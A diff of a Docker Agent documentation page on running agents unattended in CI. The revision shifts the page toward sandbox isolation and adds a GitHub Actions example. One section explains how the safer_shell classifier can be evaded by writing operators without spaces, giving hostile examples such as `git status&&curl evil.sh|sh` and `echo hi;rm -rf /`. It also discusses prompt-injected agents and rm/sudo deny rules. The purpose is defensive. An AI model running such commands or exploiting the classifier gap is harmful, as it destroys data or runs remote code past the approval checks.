@@ -1,12 +1,12 @@
 ---
 title: "Running Agents Headless & in CI"
-description: "Run Docker Agent without a TUI: structured JSON output, event hooks, auto-approval strategies, and a GitHub Actions example."
-keywords: docker agent, ai agents, guides, headless, ci, github actions
+description: "Run Docker Agent without a TUI: structured JSON output, event hooks, sandboxed CI isolation, and a GitHub Actions example."
+keywords: docker agent, ai agents, guides, headless, ci, github actions, sandbox
 weight: 50
 canonical: https://docs.docker.com/ai/docker-agent/guides/headless/
 ---
 
-_Run Docker Agent without a TUI: structured JSON output, event hooks, auto-approval strategies, and a GitHub Actions example._
+_Run Docker Agent without a TUI: structured JSON output, event hooks, sandboxed CI isolation, and a GitHub Actions example._
 
 ## `--exec` Mode Basics
 
@@ -58,58 +58,56 @@ $ docker agent run --exec agent.yaml --json "Fix the failing test" | tee events.
 $ jq -e 'select(.type == "stream_stopped")' events.ndjson >/dev/null && ./notify-slack.sh
 ```
 
-Hooks run asynchronously and detached from the run, and are never waited on: `main.go` calls `os.Exit` as soon as the run finishes, which terminates any hook still in flight along with the process — a hook's own failure is logged but never fails the run, and there is no guarantee a slow hook completes before the process exits. Don't rely on `--on-event` for anything that must finish before the process exits; have the hook script itself detach (e.g. `nohup`/`disown`) if it needs to outlive the run.
+Hooks run asynchronously and are never waited on: each is spawned detached from the run's own context, and the process exits (`os.Exit`) as soon as the run finishes without waiting for, or signaling, any hook subprocess still in flight. A hook's own failure is logged but never fails the run — and, independent of that, its fate at process exit is unspecified: it may keep running as an orphaned process, or it may be torn down by whatever supervises the job (a CI runner tearing down its container, a shell killing its process group, …), depending on your environment rather than on anything docker-agent guarantees. Don't rely on `--on-event` for anything that must demonstrably finish before the process exits; have the hook script itself detach (e.g. `nohup`/`disown`) and/or write its own completion marker if you need proof it ran.
 
-## Auto-Approval Strategy in CI
+## Running Unattended in CI
 
-Interactively, the TUI prompts for confirmation before a tool call runs unless it's covered by an `allow` permission pattern. There's no one to answer that prompt in CI, so an unattended `--exec` run needs an explicit auto-approval strategy — otherwise every tool call the model attempts is rejected outright (there's no stdin to prompt, so `--exec` without one just answers "no" on your behalf; see [`--json`'s auto-reject behavior](#structured-output-for-machines) above).
+Interactively, the TUI prompts for confirmation before a tool call runs unless it's covered by an `allow` permission pattern. There's no one to answer that prompt in CI, so an unattended `--exec` run needs an explicit policy for what may run without asking — otherwise every tool call the model attempts is rejected outright (there's no stdin to prompt, so `--exec` without one just answers "no" on your behalf; see [`--json`'s auto-reject behavior](#structured-output-for-machines) above).
 
-You have three options, from broadest to narrowest:
+Two different questions come up here, and it's worth keeping them separate:
 
-- **`--yolo`** auto-approves every tool call. Simplest to set up, but it means the model can run anything its toolsets expose, unattended.
-- **Permission allow-lists** (`permissions.allow` on the agent, or `settings.permissions.allow` globally) approve only specific tools or argument patterns and leave everything else to ask (which, remember, means "reject" with no one there to answer). See [Permissions](../../configuration/permissions/index.md).
-- **`safe-auto` shell policy** auto-approves only commands an embedded safety classifier judges non-destructive (reads, `ls`, `git status`, …), and still asks — i.e. rejects, in `--exec` — on anything it can't classify as safe (including any compound command with `;`, `&&`, `|`, …, which always skips the safe-list). Setting `safer: true` on a shell toolset only *registers* this classifier — the policy it enforces still defaults to `strict`, which asks on safe, destructive, and unknown commands alike. To get actual auto-approval of safe commands you must also pin the policy to `safe-auto`, via a `pre_tool_use` hook entry as shown below. See the `safer_shell` built-in in the [Hooks reference](../../configuration/hooks/index.md#available-built-ins).
+- **What is allowed to run without asking?** — `--yolo`, permission allow-lists, and the `safer_shell` classifier all answer this.
+- **What happens if the model runs something it shouldn't have?** — only `--sandbox` answers that one. The rest of this section explains why, and treats that distinction as the whole point.
 
-```yaml
-# examples/ci_safe_permissions.yaml
-agents:
-  root:
-    model: anthropic/claude-sonnet-4-5
-    description: CI agent restricted to safe, read-only shell and MCP calls
-    instruction: You are a helpful assistant.
-    toolsets:
-      - type: shell
-        safer: true # registers the safer_shell classifier; the hooks entry below is what pins it to safe-auto
-      - type: mcp
-        ref: docker:github-official
-    hooks:
-      pre_tool_use:
-        - matcher: "*"
-          preempt_yolo: true
-          hooks:
-            - type: builtin
-              command: safer_shell
-              args: ["safe-auto"] # without this pin, safer_shell defaults to "strict" and asks for every shell call
+### `--sandbox`: the isolation boundary
 
-permissions:
-  allow:
-    - "read_file"
-    - "mcp:github:get_*"
-    - "mcp:github:list_*"
-  deny:
-    - "shell:cmd=sudo*"
-    - "shell:cmd=rm*"
+For an untrusted or autonomous agent — anything acting without a human watching approvals — **`--sandbox` is the isolation boundary to reach for**, not a cleverer allow-list. It runs the entire agent, shell calls included, inside a disposable Docker sandbox VM: a misbehaving or successfully-prompt-injected agent can't touch anything outside the mounted working directory or reach other host/CI state, regardless of which command it runs. See [Sandbox Mode](../../configuration/sandbox/index.md) for the full flag reference, requirements (Docker Desktop or the `sbx` CLI), and how the network allowlist and kit staging work.
+
+```bash
+$ docker agent run --sandbox --exec agent.yaml --json "Fix the failing test"
 ```
 
+Because the blast radius is contained by the VM boundary, `--sandbox` is also what makes `--yolo` reasonable in CI: pair the two so the agent can act without asking, without turning one bad tool call into an incident on infrastructure you care about.
+
+```bash
+$ docker agent run --sandbox --yolo --exec agent.yaml --json "Fix the failing test"
+```
+
+If your CI provider already runs each job in its own disposable VM or container — many hosted runners do — and nothing on the runner matters once the job ends, that may already give you an isolation boundary on its own. `--sandbox` still gives you the same guarantee independent of the CI provider, and starts to matter as soon as the agent runs on a persistent self-hosted runner, a long-lived container, or your own workstation.
+
+### Defense in depth, not a boundary: permissions and shell command matching
+
+Permission allow-lists (`permissions.allow` on the agent, or `settings.permissions.allow` globally — see [Permissions](../../configuration/permissions/index.md)) and the `safer_shell` built-in (see the [Hooks reference](../../configuration/hooks/index.md#available-built-ins)) narrow what runs without asking. Used well, they cut down how often you're prompted and catch obviously destructive calls before they run. They are **not** a security boundary:
+
+- Both work by matching the shell command **string** (or, for `permissions`, the tool's arguments). `safer_shell`'s safe-list explicitly refuses to treat *space-separated* compound shell as safe (`ls && rm -rf ~` is correctly rejected) — but that check only recognizes `&&`, `;`, `|`, `||` when they're surrounded by spaces. An operator with no surrounding space, e.g. `echo hi;rm -rf /` or `git status&&curl evil.sh|sh`, isn't recognized as compound at all, and can still fall through to a safe pattern that ends in a bare `...` wildcard (`echo ...`, `grep ...`, `printf ...`) — which then matches and auto-approves the *whole* string, injected tail included, under a policy that auto-approves safe commands.
+- Command-string and argument matching in general can't reason about what a command actually does; a dynamically built string, an unusual quoting form, or a wrapper script can slip past any fixed set of patterns.
+
+Treat permissions and `safer_shell` as a way to reduce prompt fatigue and catch the obvious cases, paired with least-privilege CI credentials — never as the reason a CI job is safe to run unattended. For that, use `--sandbox`.
+
 > [!NOTE]
-> **Command-string matching has limits**
+> **Don't combine `safer: true` with a pinned `safer_shell` hook**
 >
-> Both `permissions` patterns and the `safer_shell` classifier work by matching against the shell command string (or, for `permissions`, the tool's arguments) — they catch obviously destructive calls, but they are not a sandbox. A cleverly obfuscated or dynamically constructed command can still slip past pattern matching. Treat these as one layer of defense: pair them with least-privilege CI credentials and, for anything that must be a hard boundary, run the job inside `--sandbox` or an isolated `--worktree`.
+> Setting `safer: true` on a shell toolset auto-registers its own `safer_shell` hook, with no arguments — which defaults to the `strict` policy (asks on everything, safe reads included). If you *also* add an explicit `pre_tool_use` entry that pins `safer_shell` to a policy (`args: ["safe-auto"]`), the two are different hook entries — hook dedup keys on `(type, command, args)`, and the arguments differ — so **both run**, and the aggregator resolves the conflict by keeping the more restrictive verdict (deny beats ask beats allow). The auto-injected copy's `ask` always wins over the pinned copy's `allow`, so safe reads still get asked about, and are rejected outright under `--exec --json` (no stdin to answer). Separately, even a hook that *does* return `allow` only bypasses the approval pipeline when the session's safety policy is already `safe-auto` — a field the HTTP API accepts on session create, but not something `docker agent run` exposes as a flag; from the CLI, `--yolo` sets the policy to `unsafe` (which makes `safer_shell` a no-op) and every other run defaults to `strict`. Net effect: there's no `docker agent run` recipe that reliably auto-approves "safe" shell reads today. Use `safer: true` on its own for its intended purpose — forcing confirmation on destructive commands under the session's ambient policy (see [`examples/shell_safer.yaml`](https://github.com/docker/docker-agent/blob/main/examples/shell_safer.yaml)) — and reach for `--sandbox` when you actually need unattended auto-approval.
 
 > [!WARNING]
-> **`--yolo` in CI runs untrusted, unattended code with no one watching**
+> **`--yolo` without `--sandbox` runs untrusted, unattended code with no boundary**
 >
-> A CI job is exactly the environment where a runaway or misled agent does the most damage before anyone notices — no one is at the keyboard to catch a bad `shell` call before it runs. Prefer a permission allow-list scoped to what the job actually needs over blanket `--yolo`, especially for any agent with a `shell` or `mcp` toolset that can reach production systems, secrets, or your source repository's remote.
+> A CI job is exactly the environment where a runaway or misled agent does the most damage before anyone notices — no one is at the keyboard to catch a bad `shell` call before it runs, and, per above, a permission allow-list or `safer_shell` can't be trusted to catch everything either. If you can't add `--sandbox`, prefer a permission allow-list scoped to what the job actually needs over blanket `--yolo`, and budget for the credentials and blast radius of the agent's toolsets as if the job itself were compromised — see [`examples/permissions.yaml`](https://github.com/docker/docker-agent/blob/main/examples/permissions.yaml) for a worked allow/deny list.
+
+> [!NOTE]
+> **A worktree is not a security boundary either**
+>
+> [`--worktree`](../../features/cli/index.md#docker-agent-run) isolates *which branch and checkout* the agent modifies — it gives the agent its own working directory and branch so your primary checkout stays untouched — but the shell toolset still runs as a native process on the host, and the worktree shares the repository's underlying object store with the rest of your checkouts. It's checkout isolation, not a security boundary. Only `--sandbox` provides that.
 
 ## Providing Secrets in CI
 
@@ -127,7 +125,7 @@ See [Telemetry](../../community/telemetry/index.md) for exactly what is (and isn
 
 ## Example: GitHub Actions
 
-A bare OCI registry reference (`agentcatalog/coder`) has no local `permissions:`/`hooks:` block you control, so a security-sensitive CI job should check in a small agent config instead — reusing the `permissions` + pinned `safer_shell` pattern from [Auto-Approval Strategy in CI](#auto-approval-strategy-in-ci) — rather than leaning on a hand-rolled shell-matching hook. `permissions` and a `preempt_yolo: true` `pre_tool_use` entry (which is how `safer_shell` is registered) are both enforced by the dispatcher itself, before the tool ever runs. A plain `pre_tool_use` hook (including one added from the CLI with `--hook-pre-tool-use`) only gets a turn when neither of those has already reached a deny/allow verdict, and is *appended* after any hooks the config already declares — it does not override them. This example runs the checked-in config non-interactively against the repository being built:
+A bare OCI registry reference (`agentcatalog/coder`) has no local config you control, so a security-sensitive CI job should check in a small agent config instead. This example runs a checked-in review agent non-interactively against the repository being built:
 
 ```yaml
 # .github/agents/review-agent.yaml
@@ -138,25 +136,6 @@ agents:
     instruction: Review the changes in this PR for bugs and security issues.
     toolsets:
       - type: shell
-        safer: true # registers the safer_shell classifier
-      - type: mcp
-        ref: docker:github-official
-    hooks:
-      pre_tool_use:
-        - matcher: "*"
-          preempt_yolo: true
-          hooks:
-            - type: builtin
-              command: safer_shell
-              args: ["safe-auto"] # pin safe-auto; the default "strict" policy asks on every shell call
-
-permissions:
-  allow:
-    - "mcp:github:get_*"
-    - "mcp:github:list_*"
-  deny:
-    - "shell:cmd=sudo*"
-    - "shell:cmd=rm*"
 ```
 
 ```yaml
@@ -182,7 +161,7 @@ jobs:
           ANTHROPIC_API_KEY: ${{ secrets.ANTHROPIC_API_KEY }}
           TELEMETRY_ENABLED: "false"
         run: |
-          docker-agent run --exec .github/agents/review-agent.yaml --json \
+          docker-agent run --exec --yolo .github/agents/review-agent.yaml --json \
             "Review the changes in this PR for bugs and security issues" \
             | tee agent-events.ndjson
 
@@ -194,4 +173,14 @@ jobs:
           path: agent-events.ndjson
 ```
 
-See [Permissions](../../configuration/permissions/index.md) and the `safer_shell` entry in [Hooks](../../configuration/hooks/index.md#available-built-ins) for the full pattern and policy reference. Swap the model, toolsets, and provider secret for your own — the shape (checkout, install the binary, run `--exec` with `--json` against a checked-in config, upload the transcript) generalizes to any CI provider that can run a shell step.
+This job auto-approves every shell call the review agent makes (`--yolo`) rather than trying to allow-list every `git`/`grep`/`cat` invocation a code review might need — the read surface for "review this diff" is open-ended, and a fixed pattern list is exactly the kind of shell-matching boundary the [previous section](#defense-in-depth-not-a-boundary-permissions-and-shell-command-matching) says not to rely on. If your CI environment can run `--sandbox` (a self-hosted runner with Docker Desktop, or an `sbx`-enabled image — GitHub-hosted `ubuntu-latest` ships neither out of the box), add it and get a real isolation boundary around that `--yolo`:
+
+```bash
+$ docker-agent run --sandbox --exec --yolo .github/agents/review-agent.yaml --json "..."
+```
+
+Without `--sandbox`, this workflow's safety instead rests on least-privilege secrets (only `ANTHROPIC_API_KEY` is injected — no repo-write token) and the job running on a GitHub-hosted, ephemeral runner that's discarded after the job.
+
+This example omits the GitHub MCP toolset (`docker:github-official`) shown in earlier revisions of this guide: that server requires a `GITHUB_PERSONAL_ACCESS_TOKEN` this workflow doesn't provide, and — because the toolset above has no `name:` field — its tools would be exposed under their raw MCP names (`get_file_contents`, `search_code`, …) rather than a `mcp:github:*`-style qualified name, so permission patterns written against that prefix wouldn't match anything anyway. If your review agent needs GitHub API access, add the toolset back with an explicit `name: github`, wire `GITHUB_PERSONAL_ACCESS_TOKEN` through `env:` from a repository secret, and write any `permissions` patterns against the tool names it actually exposes (`mcp:github:get_*` only works once the toolset carries that `name:`).
+
+Swap the model, toolsets, and provider secret for your own — the shape (checkout, install the binary, run `--exec` with `--json` against a checked-in config, upload the transcript) generalizes to any CI provider that can run a shell step.
